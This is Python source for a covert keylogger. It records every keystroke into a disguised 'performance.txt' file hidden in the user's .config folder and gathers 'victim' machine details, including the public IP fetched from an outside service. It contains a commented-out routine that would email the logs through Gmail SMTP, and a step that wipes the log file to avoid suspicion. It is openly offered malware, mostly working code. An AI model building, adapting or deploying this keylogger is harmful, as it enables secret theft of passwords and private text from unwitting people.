import os
import platform;
import sys;
import socket;
import smtplib;
import multiprocessing;
from cryptography.fernet import Fernet;
from email.mime.text import MIMEText;
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
from typing import *;
from pynput.keyboard import Listener, Key
from requests import get;

HOMEPATH: str = ""
FILEPATH: str = ""
KEYS: List[Key] = []
COUNT: int = 0

def main():
    makePath()  # Create the path for the files to be stored

    # Create process to get info
    infoProcess = multiprocessing.Process(target=victimInfo)
    infoProcess.start()

    # Keylogger process runs
    with Listener(on_press=keyPress) as listener:
        listener.join()

    # Info process runs at the same time as well to not interrupt the keylogger
    infoProcess.join()

def keyPress(key: Key) -> None:
    """
    Function to deal with keys being pressed when listener captures them
    """
    global KEYS, COUNT

    KEYS.append(key)
    COUNT += 1
    if COUNT >= 1: # if we have more than one key in our KEYS array then we write
        COUNT = 0 # reset count
        writeKey(KEYS);
        KEYS = [] # reset KEYS array

def writeKey(keys: List[Key]) -> None:
    """ 
    This will write keys to a file that is created
    but checking what OS we are on to create the file accordingly
    the plan is to create the file in a folder that a normal
    person will not check in
    """
    global FILEPATH
    global EXISTS
    fileSize: int = 0;

    with open(FILEPATH, "a") as keyFile:
        for key in keys:
            k = str(key).replace("'", "") # Replace quotes that come with keys
            if k.find("space") > 0: # Check if it is a space character
                keyFile.write("\n")
            if k.find("Key") == -1: # Check if it is a special key
                keyFile.write(k)
        fileSize = os.path.getsize(FILEPATH) # Check the size of the file and when it gets to a certain size send email
        print(fileSize)
        if (fileSize % 900 == 0): # Check size to send email and possibly wipe the current text file
            clear()

def victimInfo() -> None:
    """
    Function to get the information of the victims computer
    and add it to a text file
    """
    global FILEPATH
    filePath: str = FILEPATH.replace("performance.txt", "info.txt")

    with open(filePath, "w") as infoFile:
        hostname: str = socket.gethostname()
        privateIP: str = socket.gethostbyname(hostname)
        try:
            publicIp: str = get("https://api.ipify.org").text
            infoFile.write("Public IP: " + publicIp + "\n")
        except Exception:
            infoFile.write("Unable to get Public IP\n")
        infoFile.write("Processor: " + platform.processor() + "\n")
        infoFile.write("System: " + platform.system() + " " + platform.version() + "\n")
        infoFile.write("Machine: " + platform.machine() + "\n")
        infoFile.write("Hostname: " + hostname + "\n")
        infoFile.write("Private IP: " + privateIP)

def makePath():
    global HOMEPATH
    global FILEPATH

    if os.name == "posix": # We are on a Linux or Mac sytem
        HOMEPATH = "/home/"  # Set Home Path that is usual for Mac and Linux
        try:
            username = os.getlogin() + "/" # We will try to get their username
            FILEPATH = searchFile(HOMEPATH + username, ".config") + "/performance.txt" # We will look for .config folder
            if FILEPATH is None: # .config was not found then we will make one
                try:
                    os.makedirs(HOMEPATH + username + ".config")
                    FILEPATH = HOMEPATH + username + ".config/performance.txt" # Set file path to in the directory that we created
                except OSError:
                    sys.exit(1)
        except Exception:
            sys.exit(1)
    elif os.name == "nt":
        HOMEPATH = "\\C:\\"
        print("Windows Machine")
        sys.exit(1)

def searchFile(start: str, target: str) -> Union[str, None]:
    """
    Function to search if a file or folder exists in order to check
    for the existence of the .config file to store keylogs
    """
    for root, dir, file in os.walk(start):  # Search every directory and file
        if target in file or target in dir:
            return os.path.join(root, target)
    return None

"""def sendEmail() -> None:

    Send email with current text in the keylogger file
    # Add Mail Configuration
    smtp_server: str = "smtp.gmail.com"
    smtp_port: int = 587
    smtp_username: str = "USERNAME HERE"
    smtp_password: str = "PASSWORD HERE"

    # Email Content
    sender: str = "USERNAME HERE"
    recipient: str = "RECIPIENT EMAIL HERE"
    subject: str = "New Keys"
    body: str = ""

    # Create a multipart message
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = recipient

    # Add the email body
    message.attach(MIMEText(body, 'plain'))
    
    # Attach the file
    attachment = open(FILEPATH, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={FILEPATH}')
    message.attach(part)

    try:
        # Establish a connection to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()

        # Login to email account
        server.login(smtp_username, smtp_password)

        # Send the email
        server.sendmail(sender, recipient, message.as_string())

    except Exception as e:
        print('An error occurred while sending the email:', str(e))
    finally:
        # Close the connection to the SMTP server
        server.quit()"""

def clear():
    """
    Function sends the text file as an email to personal email
    and then clears out the current keys in the text file to not arise suspicion
    """
    #sendEmail()
    with open(FILEPATH, "w") as keyFile:
        keyFile.truncate(0)

if __name__ == "__main__":
    main()